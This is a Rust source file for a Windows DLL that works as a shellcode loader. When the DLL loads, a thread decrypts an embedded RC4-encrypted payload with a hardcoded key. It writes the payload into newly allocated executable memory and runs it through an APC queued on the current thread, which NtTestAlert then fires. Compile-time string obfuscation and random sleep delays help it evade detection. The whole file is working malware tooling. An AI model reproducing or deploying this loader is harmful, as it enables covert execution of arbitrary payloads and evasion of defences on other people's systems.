#![cfg(windows)]
use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtProtectVirtualMemory, NtWriteVirtualMemory};
use ntapi::ntpsapi::{
    NtCurrentProcess, NtCurrentThread, NtQueueApcThread, NtTestAlert, PPS_APC_ROUTINE,
};
use ntapi::winapi::ctypes::c_void;
use std::ptr::null_mut;
use windows::core::s;
use windows::Win32::Foundation::{BOOL, HINSTANCE, HWND};
use windows::Win32::System::SystemServices::DLL_PROCESS_ATTACH;
use windows::Win32::UI::WindowsAndMessaging::MessageBoxA;
use ntapi::ntpsapi::{NtQueryInformationProcess, PROCESS_BASIC_INFORMATION};
//string obfuscation on compile time
use obfstr::obfstr;
use rand::Rng;
use rc4::{KeyInit, Rc4, StreamCipher};
use std::mem::zeroed;
use std::thread;
use std::time::Duration;

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(hinstance: HINSTANCE, reason: u32, _: *mut std::ffi::c_void) -> BOOL {
    match reason {
        DLL_PROCESS_ATTACH => {
            thread::spawn(|| {
                ntapcsheep_main();
                //run_msgbox();
            });
            //ntapcsheep_main(); -> does not work
        }
        _ => {}
    }
    true.into()
    //winapi::shared::minwindef::TRUE
}

#[allow(dead_code)]
fn run_msgbox() {
    unsafe {
        MessageBoxA(HWND(0), s!("Hello"), s!("dll"), Default::default());
    }
}

fn get_embedded_file() -> &'static [u8] {
    include_bytes!("../../payloads/earlybird.rc4")
}

fn decrypt_rc4(data: &[u8]) -> Vec<u8> {
    let mut buf = data.to_vec(); // Convert byte slice to Vec<u8> for in-place modification
    let mut rc4 = Rc4::new(b"nationalgrass".into());
    rc4.apply_keystream(&mut buf); // Decrypt in-place
    buf // Return the decrypted data
}

fn zzz_random(lower: u64, upper: u64) {
    // Ensure that the lower limit is less than or equal to the upper limit
    if lower > upper {
        println!("[*] Lower limit should not exceed the upper limit.");
        return;
    }

    // Initialize the random number generator
    let mut rng = rand::thread_rng();
    // Generate a random number between the specified lower and upper bounds
    let rand_millis = rng.gen_range(lower..=upper);
    println!(
        "{}, {:?}, {}",
        obfstr!("[*] Sleeping for "),
        rand_millis,
        obfstr!(" milliseconds")
    );
    // Sleep for the random duration
    thread::sleep(Duration::from_millis(rand_millis));
}

const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE_READ: u32 = 0x20;

#[allow(dead_code)]
fn ntapcsheep_main() {
    //some current process stuff

    unsafe {
        let mut pbi: PROCESS_BASIC_INFORMATION = zeroed();
        let mut return_length: u32 = 0;

        // Query the process information

        NtQueryInformationProcess(
            NtCurrentProcess,
            0,
            &mut pbi as *mut _ as *mut _,
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length,
        );

        //println!("[*] current process id: {}", pbi.UniqueProcessId as u32);
        println!(
            "{} {:?}",
            obfstr!("[*] current process id: "),
            pbi.UniqueProcessId as u32
        );
    }

    //unsafe {winapi::um::wincon::FreeConsole();};
    let shellcodeenc = get_embedded_file();
    let shellcode = decrypt_rc4(shellcodeenc);

    unsafe {
        let mut allocstart: *mut c_void = null_mut();
        let mut size: usize = shellcode.len();
        let mut old_protect: u32 = 0x00;

        println!("{}", obfstr!("[*] ntallocate virtual memory"));
        NtAllocateVirtualMemory(
            NtCurrentProcess,
            &mut allocstart,
            0,
            &mut size,
            //0x00003000,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        println!("{}", obfstr!("[*] ntwrite payload to memory"));
        NtWriteVirtualMemory(
            NtCurrentProcess,
            allocstart,
            shellcode.as_ptr() as _,
            shellcode.len() as usize,
            null_mut(),
        );

        println!("{}", obfstr!("[*] mem protect -> rx"));
        NtProtectVirtualMemory(
            NtCurrentProcess,
            &mut allocstart,
            &mut size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        zzz_random(1200, 2100);

        println!("{}", obfstr!("[*] queue the apc"));
        NtQueueApcThread(
            NtCurrentThread,
            Some(std::mem::transmute(allocstart)) as PPS_APC_ROUTINE,
            allocstart,
            null_mut(),
            null_mut(),
        );

        zzz_random(1850, 3191);

        println!("{}", obfstr!("[*] nt test alert"));
        NtTestAlert();
    }
}
